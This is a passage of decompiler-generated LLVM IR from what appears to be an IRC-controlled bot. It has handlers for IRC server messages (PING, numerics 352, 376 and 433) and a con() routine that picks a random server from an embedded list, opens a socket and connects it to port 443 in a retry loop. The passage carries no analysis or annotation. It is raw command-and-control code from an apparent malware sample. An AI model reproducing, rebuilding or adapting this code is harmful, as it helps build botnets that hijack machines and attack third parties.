  uselistorder i32 %stack_var_-1140.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10001990, { 1, 0 }
  uselistorder i32 %stack_var_-1140.137, { 1, 0 }
  uselistorder i32 %storemerge1238, { 1, 0 }
  uselistorder i8* %stack_var_-1136.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-1136.0.in.lcssa, { 2, 0, 1 }
  uselistorder i32 %storemerge1146, { 1, 0 }
  uselistorder i32 %v1_10001824, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_10001800, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10001738, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1144, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 11, 9 }
  uselistorder i32* %r3.global-to-local, { 20, 8, 9, 1, 10, 11, 22, 12, 19, 3, 4, 13, 2, 14, 15, 5, 16, 17, 21, 6, 18, 7, 0 }
  uselistorder i32* %r29.global-to-local, { 10, 11, 12, 8, 9, 13, 14, 0, 1, 15, 16, 2, 3, 17, 18, 4, 5, 19, 20, 6, 7 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10001bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10001a74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001a54, { 1, 0 }
  uselistorder label %dec_label_pc_10001a08, { 1, 0 }
  uselistorder label %dec_label_pc_100019d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000198c, { 1, 0 }
  uselistorder label %dec_label_pc_10001960, { 1, 0 }
  uselistorder label %dec_label_pc_10001998.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100018e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000187c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000185c, { 1, 0 }
  uselistorder label %dec_label_pc_100017b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001794, { 1, 0 }
  uselistorder label %dec_label_pc_1000172c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000170c, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10001c64 = load i32, i32* @global_var_1002c2fc.56, align 4
  %v5_10001c7c = load i32, i32* @r7, align 4
  %v6_10001c7c = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_10015b84.61 to i32), i32 %v3_10001c64, i32 268500992, i32 %v5_10001c7c)
  %v3_10001c84 = load i32, i32* @global_var_1002c314.34, align 4
  %v3_10001c8c = load i32, i32* @global_var_1002c310.62, align 4
  %v6_10001ca8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_10015b94.63 to i32), i32 %v3_10001c84, i32 %v3_10001c8c, i32 268500992)
  %v3_10001cb0 = load i32, i32* @global_var_1002c2fc.56, align 4
  %v5_10001cc8 = load i32, i32* @r7, align 4
  %v6_10001cc8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_10015ba4.64 to i32), i32 %v3_10001cb0, i32 268500992, i32 %v5_10001cc8)
  ret i32 %v6_10001cc8
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v5_10001d18 = load i32, i32* @r7, align 4
  %v6_10001d18 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_10015bac.65 to i32), i32 %arg3, i32 268500992, i32 %v5_10001d18)
  ret i32 %v6_10001d18
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001d34 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001d34, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10001d8c.preheader

dec_label_pc_10001d74:                            ; preds = %dec_label_pc_10001da4
  %v4_10001da4 = ptrtoint i8* %stack_var_-68.058 to i32
  %v1_10001d78 = add i32 %v4_10001da4, 1
  %v5_10001d7c = inttoptr i32 %v1_10001d78 to i8*
  %v1_10001d84 = add i32 %stack_var_-60.057, 1
  store i32 %v1_10001d84, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001d94 = call i32 @__GI_strlen()
  %v0_10001d9c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001d9c = icmp ult i32 %v0_10001d9c, %v0_10001d94
  br i1 %v2_10001d9c, label %dec_label_pc_10001da4, label %dec_label_pc_10001db8

dec_label_pc_10001da4:                            ; preds = %dec_label_pc_10001d8c.preheader, %dec_label_pc_10001d74
  %stack_var_-68.058 = phi i8* [ %v5_10001d7c, %dec_label_pc_10001d74 ], [ %stack_var_-68.164, %dec_label_pc_10001d8c.preheader ]
  %stack_var_-60.057 = phi i32 [ %v1_10001d84, %dec_label_pc_10001d74 ], [ %stack_var_-60.163, %dec_label_pc_10001d8c.preheader ]
  %v2_10001da8 = load i8, i8* %stack_var_-68.058, align 1
  %v3_10001db0 = icmp eq i8 %v2_10001da8, 32
  br i1 %v3_10001db0, label %dec_label_pc_10001db8, label %dec_label_pc_10001d74

dec_label_pc_10001db8:                            ; preds = %dec_label_pc_10001d74, %dec_label_pc_10001da4, %dec_label_pc_10001d8c.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.163, %dec_label_pc_10001d8c.preheader ], [ %v1_10001d84, %dec_label_pc_10001d74 ], [ %stack_var_-60.057, %dec_label_pc_10001da4 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.164, %dec_label_pc_10001d8c.preheader ], [ %v5_10001d7c, %dec_label_pc_10001d74 ], [ %stack_var_-68.058, %dec_label_pc_10001da4 ]
  %v4_10001db8 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10001dbc = add i32 %v4_10001db8, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001dcc = call i32 @__GI_strlen()
  %v0_10001dd4 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001dd4 = icmp eq i32 %v0_10001dd4, %v0_10001dcc
  br i1 %v4_10001dd4, label %dec_label_pc_10002094, label %dec_label_pc_10001ddc

dec_label_pc_10001ddc:                            ; preds = %dec_label_pc_10001db8
  %v5_10001dc0 = inttoptr i32 %v1_10001dbc to i8*
  %v1_10001de0 = add nuw nsw i32 %storemerge965, 1
  %tmp92 = icmp slt i32 %v1_10001de0, 5
  br i1 %tmp92, label %dec_label_pc_10001d8c.preheader, label %dec_label_pc_10001e0c.preheader

dec_label_pc_10001d8c.preheader:                  ; preds = %entry, %dec_label_pc_10001ddc
  %storemerge965 = phi i32 [ 0, %entry ], [ %v1_10001de0, %dec_label_pc_10001ddc ]
  %stack_var_-68.164 = phi i8* [ %arg3, %entry ], [ %v5_10001dc0, %dec_label_pc_10001ddc ]
  %stack_var_-60.163 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10001ddc ]
  store i32 %stack_var_-60.163, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001d9452 = call i32 @__GI_strlen()
  %v0_10001d9c53 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001d9c54 = icmp ult i32 %v0_10001d9c53, %v0_10001d9452
  br i1 %v2_10001d9c54, label %dec_label_pc_10001da4, label %dec_label_pc_10001db8

dec_label_pc_10001e0c.preheader:                  ; preds = %dec_label_pc_10001ddc
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001dbc, i32* @r3, align 4
  %v0_10001e1442 = call i32 @__GI_strlen()
  %v0_10001e1c43 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001e1c44 = icmp ult i32 %v0_10001e1c43, %v0_10001e1442
  br i1 %v2_10001e1c44, label %dec_label_pc_10001e24, label %dec_label_pc_10001e44

dec_label_pc_10001e00:                            ; preds = %dec_label_pc_10001e24
  %v1_10001e04 = add i32 %storemerge1047, 1
  store i32 %v1_10001e04, i32* %r29.global-to-local, align 4
  store i32 %v1_10001dbc, i32* @r3, align 4
  %v0_10001e14 = call i32 @__GI_strlen()
  %v0_10001e1c = load i32, i32* %r29.global-to-local, align 4
  %v2_10001e1c = icmp ult i32 %v0_10001e1c, %v0_10001e14
  br i1 %v2_10001e1c, label %dec_label_pc_10001e24, label %dec_label_pc_10001e44

dec_label_pc_10001e24:                            ; preds = %dec_label_pc_10001e0c.preheader, %dec_label_pc_10001e00
  %storemerge1047 = phi i32 [ %v1_10001e04, %dec_label_pc_10001e00 ], [ 0, %dec_label_pc_10001e0c.preheader ]
  %v2_10001e30 = add i32 %storemerge1047, %v1_10001dbc
  %v1_10001e34 = inttoptr i32 %v2_10001e30 to i8*
  %v2_10001e34 = load i8, i8* %v1_10001e34, align 1
  %v3_10001e3c = icmp eq i8 %v2_10001e34, 32
  br i1 %v3_10001e3c, label %dec_label_pc_10001e44, label %dec_label_pc_10001e00

dec_label_pc_10001e44:                            ; preds = %dec_label_pc_10001e00, %dec_label_pc_10001e24, %dec_label_pc_10001e0c.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10001e0c.preheader ], [ %v1_10001e04, %dec_label_pc_10001e00 ], [ %storemerge1047, %dec_label_pc_10001e24 ]
  %v2_10001e50 = add i32 %storemerge10.lcssa, %v1_10001dbc
  %v3_10001e58 = inttoptr i32 %v2_10001e50 to i8*
  store i8 0, i8* %v3_10001e58, align 1
  %v3_10001e60 = load i32, i32* @global_var_1002c2fc.56, align 4
  store i32 %v1_10001dbc, i32* @r3, align 4
  store i32 %v3_10001e60, i32* @r4, align 4
  %v3_10001e6c = call i32 @__GI_strcasecmp(i32 %v1_10001dbc, i32 %v3_10001e60)
  %v3_10001e74 = icmp eq i32 %v3_10001e6c, 0
  br i1 %v3_10001e74, label %dec_label_pc_10001e7c, label %dec_label_pc_10002094

dec_label_pc_10001e7c:                            ; preds = %dec_label_pc_10001e44
  %v3_10001e80 = load i32, i32* @global_var_1002c2e8.66, align 4
  %v3_10001e84 = icmp eq i32 %v3_10001e80, 0
  br i1 %v3_10001e84, label %dec_label_pc_10001e8c, label %dec_label_pc_10002094

dec_label_pc_10001e8c:                            ; preds = %dec_label_pc_10001e7c
  br label %dec_label_pc_10001ec0.preheader

dec_label_pc_10001ea8:                            ; preds = %dec_label_pc_10001ed8
  %v4_10001ed8 = ptrtoint i8* %stack_var_-68.234 to i32
  %v1_10001eac = add i32 %v4_10001ed8, 1
  %v5_10001eb0 = inttoptr i32 %v1_10001eac to i8*
  %v1_10001eb8 = add i32 %stack_var_-60.233, 1
  store i32 %v1_10001eb8, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ec8 = call i32 @__GI_strlen()
  %v0_10001ed0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ed0 = icmp ult i32 %v0_10001ed0, %v0_10001ec8
  br i1 %v2_10001ed0, label %dec_label_pc_10001ed8, label %dec_label_pc_10001eec

dec_label_pc_10001ed8:                            ; preds = %dec_label_pc_10001ec0.preheader, %dec_label_pc_10001ea8
  %stack_var_-68.234 = phi i8* [ %v5_10001eb0, %dec_label_pc_10001ea8 ], [ %stack_var_-68.340, %dec_label_pc_10001ec0.preheader ]
  %stack_var_-60.233 = phi i32 [ %v1_10001eb8, %dec_label_pc_10001ea8 ], [ %stack_var_-60.339, %dec_label_pc_10001ec0.preheader ]
  %v2_10001edc = load i8, i8* %stack_var_-68.234, align 1
  %v3_10001ee4 = icmp eq i8 %v2_10001edc, 32
  br i1 %v3_10001ee4, label %dec_label_pc_10001eec, label %dec_label_pc_10001ea8

dec_label_pc_10001eec:                            ; preds = %dec_label_pc_10001ea8, %dec_label_pc_10001ed8, %dec_label_pc_10001ec0.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.339, %dec_label_pc_10001ec0.preheader ], [ %v1_10001eb8, %dec_label_pc_10001ea8 ], [ %stack_var_-60.233, %dec_label_pc_10001ed8 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.340, %dec_label_pc_10001ec0.preheader ], [ %v5_10001eb0, %dec_label_pc_10001ea8 ], [ %stack_var_-68.234, %dec_label_pc_10001ed8 ]
  %v4_10001eec = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10001ef0 = add i32 %v4_10001eec, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001f00 = call i32 @__GI_strlen()
  %v0_10001f08 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001f08 = icmp eq i32 %v0_10001f08, %v0_10001f00
  br i1 %v4_10001f08, label %dec_label_pc_10002094, label %dec_label_pc_10001f10

dec_label_pc_10001f10:                            ; preds = %dec_label_pc_10001eec
  %v5_10001ef4 = inttoptr i32 %v1_10001ef0 to i8*
  %v1_10001f14 = add nuw nsw i32 %storemerge1141, 1
  %tmp93 = icmp slt i32 %v1_10001f14, 3
  br i1 %tmp93, label %dec_label_pc_10001ec0.preheader, label %dec_label_pc_10001f40.preheader

dec_label_pc_10001ec0.preheader:                  ; preds = %dec_label_pc_10001e8c, %dec_label_pc_10001f10
  %storemerge1141 = phi i32 [ 0, %dec_label_pc_10001e8c ], [ %v1_10001f14, %dec_label_pc_10001f10 ]
  %stack_var_-68.340 = phi i8* [ %arg3, %dec_label_pc_10001e8c ], [ %v5_10001ef4, %dec_label_pc_10001f10 ]
  %stack_var_-60.339 = phi i32 [ 0, %dec_label_pc_10001e8c ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10001f10 ]
  store i32 %stack_var_-60.339, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ec828 = call i32 @__GI_strlen()
  %v0_10001ed029 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ed030 = icmp ult i32 %v0_10001ed029, %v0_10001ec828
  br i1 %v2_10001ed030, label %dec_label_pc_10001ed8, label %dec_label_pc_10001eec

dec_label_pc_10001f40.preheader:                  ; preds = %dec_label_pc_10001f10
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ef0, i32* @r3, align 4
  %v0_10001f4819 = call i32 @__GI_strlen()
  %v0_10001f5020 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001f5021 = icmp ult i32 %v0_10001f5020, %v0_10001f4819
  br i1 %v2_10001f5021, label %dec_label_pc_10001f58, label %dec_label_pc_10001f78

dec_label_pc_10001f34:                            ; preds = %dec_label_pc_10001f58
  %v1_10001f38 = add i32 %storemerge1224, 1
  store i32 %v1_10001f38, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ef0, i32* @r3, align 4
  %v0_10001f48 = call i32 @__GI_strlen()
  %v0_10001f50 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001f50 = icmp ult i32 %v0_10001f50, %v0_10001f48
  br i1 %v2_10001f50, label %dec_label_pc_10001f58, label %dec_label_pc_10001f78

dec_label_pc_10001f58:                            ; preds = %dec_label_pc_10001f40.preheader, %dec_label_pc_10001f34
  %storemerge1224 = phi i32 [ %v1_10001f38, %dec_label_pc_10001f34 ], [ 0, %dec_label_pc_10001f40.preheader ]
  %v2_10001f64 = add i32 %storemerge1224, %v1_10001ef0
  %v1_10001f68 = inttoptr i32 %v2_10001f64 to i8*
  %v2_10001f68 = load i8, i8* %v1_10001f68, align 1
  %v3_10001f70 = icmp eq i8 %v2_10001f68, 32
  br i1 %v3_10001f70, label %dec_label_pc_10001f78, label %dec_label_pc_10001f34

dec_label_pc_10001f78:                            ; preds = %dec_label_pc_10001f34, %dec_label_pc_10001f58, %dec_label_pc_10001f40.preheader
  %storemerge12.lcssa = phi i32 [ 0, %dec_label_pc_10001f40.preheader ], [ %v1_10001f38, %dec_label_pc_10001f34 ], [ %storemerge1224, %dec_label_pc_10001f58 ]
  %v2_10001f84 = add i32 %storemerge12.lcssa, %v1_10001ef0
  %v3_10001f8c = inttoptr i32 %v2_10001f84 to i8*
  store i8 0, i8* %v3_10001f8c, align 1
  store i32 268443544, i32* @lr, align 4
  %v2_10001f94 = call i32 @inet_addr(i32 %v1_10001ef0)
  %v5_10001f9c = trunc i32 %v2_10001f94 to i8
  store i8 %v5_10001f9c, i8* %stack_var_-56, align 1
  %v4_10001fa8 = icmp eq i8 %v5_10001f9c, -1
  br i1 %v4_10001fa8, label %dec_label_pc_10001fb0, label %dec_label_pc_1000201c

dec_label_pc_10001fb0:                            ; preds = %dec_label_pc_10001f78
  store i32 268443576, i32* @lr, align 4
  %v3_10001fb4 = call i32 @__GI_gethostbyname(i32 %v1_10001ef0, i32 %v2_10001f94)
  %v3_10001fc4 = icmp eq i32 %v3_10001fb4, 0
  br i1 %v3_10001fc4, label %dec_label_pc_10001fcc, label %dec_label_pc_10001ff0

dec_label_pc_10001fcc:                            ; preds = %dec_label_pc_10001fb0
  %v3_10001fd0 = load i32, i32* @global_var_1002c314.34, align 4
  %v5_10001fe8 = load i32, i32* @r7, align 4
  %v6_10001fe8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_10015bb8.67 to i32), i32 %v3_10001fd0, i32 268500992, i32 %v5_10001fe8)
  br label %dec_label_pc_10002094

dec_label_pc_10001ff0:                            ; preds = %dec_label_pc_10001fb0
  %v2_10001ff0 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10001ff8 = add i32 %v3_10001fb4, 16
  %v2_10001ff8 = inttoptr i32 %v1_10001ff8 to i32*
  %v3_10001ff8 = load i32, i32* %v2_10001ff8, align 4
  %v1_10001ffc = inttoptr i32 %v3_10001ff8 to i32*
  %v2_10001ffc = load i32, i32* %v1_10001ffc, align 4
  %v1_10002004 = add i32 %v3_10001fb4, 12
  %v2_10002004 = inttoptr i32 %v1_10002004 to i32*
  %v3_10002004 = load i32, i32* %v2_10002004, align 4
  store i32 %v2_10001ff0, i32* @r3, align 4
  store i32 %v2_10001ffc, i32* @r4, align 4
  store i32 %v3_10002004, i32* @r5, align 4
  store i32 268443676, i32* @lr, align 4
  %v0_10002018 = call i32 @memcpy()
  %v2_1000202c.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_1000201c

dec_label_pc_1000201c:                            ; preds = %dec_label_pc_10001f78, %dec_label_pc_10001ff0
  %v0_100020ac76 = phi i32 [ %v0_10002018, %dec_label_pc_10001ff0 ], [ %v2_10001f94, %dec_label_pc_10001f78 ]
  %v2_1000202c = phi i8 [ %v2_1000202c.pre, %dec_label_pc_10001ff0 ], [ %v5_10001f9c, %dec_label_pc_10001f78 ]
  store i8 %v2_1000202c, i8* bitcast (i8** @global_var_1002c2e7.70 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_1002c2e4.69 to i8*), align 4
  store i32 256, i32* @global_var_1002c2e8.66, align 4
  br label %dec_label_pc_10002094

dec_label_pc_10002094:                            ; preds = %dec_label_pc_10001db8, %dec_label_pc_10001eec, %dec_label_pc_10001e7c, %dec_label_pc_10001e44, %dec_label_pc_10001fcc, %dec_label_pc_1000201c
  %v0_100020ac = phi i32 [ 0, %dec_label_pc_10001e7c ], [ %v3_10001e6c, %dec_label_pc_10001e44 ], [ %v6_10001fe8, %dec_label_pc_10001fcc ], [ %v0_100020ac76, %dec_label_pc_1000201c ], [ %v0_10001f00, %dec_label_pc_10001eec ], [ %v0_10001dcc, %dec_label_pc_10001db8 ]
  %v2_10002094 = load i32, i32* %stack_var_-80, align 4
  %v1_100020a0 = add i32 %v2_10002094, -12
  %v2_100020a0 = inttoptr i32 %v1_100020a0 to i32*
  %v3_100020a0 = load i32, i32* %v2_100020a0, align 4
  store i32 %v3_100020a0, i32* %r29.global-to-local, align 4
  ret i32 %v0_100020ac

; uselistorder directives
  uselistorder i32 %v2_10001f94, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.339, { 2, 0, 1 }
  uselistorder i32 %v1_10001f14, { 1, 0 }
  uselistorder i32 %v1_10001ef0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.163, { 2, 0, 1 }
  uselistorder i32 %v1_10001de0, { 1, 0 }
  uselistorder i32 %v1_10001dbc, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 4, 5, 6, 0, 1, 15, 16, 7, 8, 9, 10, 11, 12, 17, 18, 19, 20, 13, 14, 2, 3 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002094, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000201c, { 1, 0 }
  uselistorder label %dec_label_pc_10001f78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001f58, { 1, 0 }
  uselistorder label %dec_label_pc_10001ec0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001eec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10001e44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001e24, { 1, 0 }
  uselistorder label %dec_label_pc_10001d8c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10001db8, { 2, 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-80 = alloca i32, align 4
  %v3_100020d4 = load i32, i32* @global_var_1002c2fc.56, align 4
  store i32 %v3_100020d4, i32* @r3, align 4
  store i32 268443872, i32* @lr, align 4
  %v0_100020dc = call i32 @free()
  store i32 268443888, i32* @lr, align 4
  %v2_100020ec = call i32 @makestring(i32 %v0_100020dc, i32 268500992)
  %v2_100020f8 = ptrtoint i32* %stack_var_-80 to i32
  %v3_10002104 = call i32 @strcpy(i32 %v2_100020f8, i8* bitcast (i32* @global_var_10015c18.73 to i8*))
  store i32 %v2_100020ec, i32* @r4, align 4
  %v2_10002114 = bitcast i32* %stack_var_-80 to i8*
  %v3_10002114 = call i32 @strcat(i8* %v2_10002114, i32 %v2_100020ec)
  store i32 %v2_100020f8, i32* @global_var_1002c2fc.56, align 4
  ret i32 %v3_10002114

; uselistorder directives
  uselistorder i32 %v2_100020ec, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10002274 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10002278 = ptrtoint i32* %stack_var_-24 to i32
  %v2_100022d0 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10002154

dec_label_pc_10002154:                            ; preds = %dec_label_pc_10002154.backedge, %entry
  store i32 -1, i32* @global_var_1002c300.21, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_1000216c = load i32, i32* @global_var_1002c2dc.74, align 4
  %v3_10002170 = icmp eq i32 %v3_1000216c, 0
  br i1 %v3_10002170, label %dec_label_pc_10002178, label %dec_label_pc_100021b0

dec_label_pc_10002178:                            ; preds = %dec_label_pc_10002154
  store i32 268444028, i32* @lr, align 4
  %v0_10002178 = call i32 @random()
  %v3_10002184 = load i32, i32* @global_var_1002c240.75, align 4
  %v2_10002188 = srem i32 %v0_10002178, %v3_10002184
  %v1_1000219c = mul i32 %v2_10002188, 4
  %v2_100021a0 = add i32 %v1_1000219c, ptrtoint ([14 x i8]** @global_var_1002c244.77 to i32)
  %v1_100021a4 = inttoptr i32 %v2_100021a0 to i32*
  %v2_100021a4 = load i32, i32* %v1_100021a4, align 4
  store i32 %v2_100021a4, i32* @global_var_1002c308.78, align 4
  br label %dec_label_pc_100021b0

dec_label_pc_100021b0:                            ; preds = %dec_label_pc_10002154, %dec_label_pc_10002178
  store i32 0, i32* @global_var_1002c2dc.74, align 4
  br label %dec_label_pc_100021bc

dec_label_pc_100021bc:                            ; preds = %dec_label_pc_100021bc, %dec_label_pc_100021b0
  store i32 268444108, i32* @lr, align 4
  %v3_100021c8 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_100021c8, i32* @global_var_1002c300.21, align 4
  %v1_100021e0 = icmp slt i32 %v3_100021c8, 0
  br i1 %v1_100021e0, label %dec_label_pc_100021bc, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021bc
  %v3_100021ec = load i32, i32* @global_var_1002c308.78, align 4
  store i32 268444152, i32* @lr, align 4
  %v1_100021f4 = call i32 @inet_addr(i32 %v3_100021ec)
  %v3_100021fc = icmp eq i32 %v1_100021f4, 0
  br i1 %v3_100021fc, label %dec_label_pc_10002224, label %dec_label_pc_10002204

dec_label_pc_10002204:                            ; preds = %dec_label_pc_100021e8
  %v3_10002208 = load i32, i32* @global_var_1002c308.78, align 4
  store i32 268444180, i32* @lr, align 4
  %v1_10002210 = call i32 @inet_addr(i32 %v3_10002208)
  %v4_1000221c = icmp eq i32 %v1_10002210, -1
  br i1 %v4_1000221c, label %dec_label_pc_10002224, label %dec_label_pc_10002298

dec_label_pc_10002224:                            ; preds = %dec_label_pc_10002204, %dec_label_pc_100021e8
  %v3_10002228 = load i32, i32* @global_var_1002c308.78, align 4
  store i32 268444212, i32* @lr, align 4
  %v2_10002230 = call i32 @__GI_gethostbyname(i32 %v3_10002228, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v3_10002240 = icmp eq i32 %v2_10002230, 0
  br i1 %v3_10002240, label %dec_label_pc_10002248, label %dec_label_pc_10002268

dec_label_pc_10002248:                            ; preds = %dec_label_pc_10002224
  store i32 0, i32* @global_var_1002c308.78, align 4
  %v3_10002258 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 268444260, i32* @lr, align 4
  %v1_10002260 = call i32 @close(i32 %v3_10002258)
  br label %dec_label_pc_10002154.backedge

dec_label_pc_10002154.backedge:                   ; preds = %dec_label_pc_10002248, %dec_label_pc_10002400
  br label %dec_label_pc_10002154

dec_label_pc_10002268:                            ; preds = %dec_label_pc_10002224
  %v1_1000226c = add i32 %v2_10002230, 16
  %v2_1000226c = inttoptr i32 %v1_1000226c to i32*
  %v3_1000226c = load i32, i32* %v2_1000226c, align 4
  %v1_10002270 = inttoptr i32 %v3_1000226c to i32*
  %v2_10002270 = load i32, i32* %v1_10002270, align 4
  %v1_10002280 = add i32 %v2_10002230, 12
  %v2_10002280 = inttoptr i32 %v1_10002280 to i32*
  %v3_10002280 = load i32, i32* %v2_10002280, align 4
  store i32 %v3_10002280, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002294.79 to i32), i32* @lr, align 4
  %v4_10002290 = call i32 @bcopy(i32 %v2_10002270, i32 %v2_10002278, i32 %v3_10002280, i32 %v2_10002230)
  br label %dec_label_pc_100022b0

dec_label_pc_10002298:                            ; preds = %dec_label_pc_10002204
  %v3_1000229c = load i32, i32* @global_var_1002c308.78, align 4
  store i32 268444328, i32* @lr, align 4
  %v1_100022a4 = call i32 @inet_addr(i32 %v3_1000229c)
  store i32 %v1_100022a4, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100022b0

dec_label_pc_100022b0:                            ; preds = %dec_label_pc_10002268, %dec_label_pc_10002298
  store i32 2, i32* %stack_var_-28, align 4
  store i32 443, i32* @r3, align 4
  %v1_100022bc = call i32 @htons(i32 443)
  %v3_100022cc = load i32, i32* @global_var_1002c300.21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100022ec.80 to i32), i32* @lr, align 4
  %v3_100022e8 = call i32 @ioctl(i32 %v3_100022cc, i32 -2147195266, i32 %v2_100022d0)
  store i32 268444404, i32* @lr, align 4
  %v1_100022f0 = call i32 @__GI_time(i32 0)
  store i32 268444648, i32* @lr, align 4
  %v1_100023e411 = call i32 @__GI_time(i32 0)
  %v2_100023f412 = sub i32 %v1_100023e411, %v1_100022f0
  %tmp1016 = icmp ult i32 %v2_100023f412, 10
  br i1 %tmp1016, label %dec_label_pc_10002300, label %dec_label_pc_10002400

dec_label_pc_10002300:                            ; preds = %dec_label_pc_100022b0, %dec_label_pc_100023d8
  %v0_10002300 = call i32 @__errno_location()
  %v2_1000230c = inttoptr i32 %v0_10002300 to i32*
  store i32 0, i32* %v2_1000230c, align 4
  %v3_10002314 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 268444460, i32* @lr, align 4
  %v3_10002328 = call i32 @connect(i32 %v3_10002314, i32 %v2_10002274, i32 16)
  %v3_10002330 = icmp eq i32 %v3_10002328, 0
  br i1 %v3_10002330, label %dec_label_pc_1000234c, label %dec_label_pc_10002338

dec_label_pc_10002338:                            ; preds = %dec_label_pc_10002300
  %v0_10002338 = call i32 @__errno_location()
  %v1_10002340 = inttoptr i32 %v0_10002338 to i32*
  %v2_10002340 = load i32, i32* %v1_10002340, align 4
  %v3_10002344 = icmp eq i32 %v2_10002340, 106
  br i1 %v3_10002344, label %dec_label_pc_1000234c, label %dec_label_pc_100023b0

dec_label_pc_1000234c:                            ; preds = %dec_label_pc_10002338, %dec_label_pc_10002300
  %v3_10002350 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 268444524, i32* @lr, align 4
  %v5_10002368 = call i32 @__GI_setsockopt(i32 %v3_10002350, i32 1, i32 13, i32 0, i32 0)
  %v3_10002370 = load i32, i32* @global_var_1002c300.21, align 4
  store i32 268444556, i32* @lr, align 4
  %v5_10002388 = call i32 @__GI_setsockopt(i32 %v3_10002370, i32 1, i32 2, i32 0, i32 0)
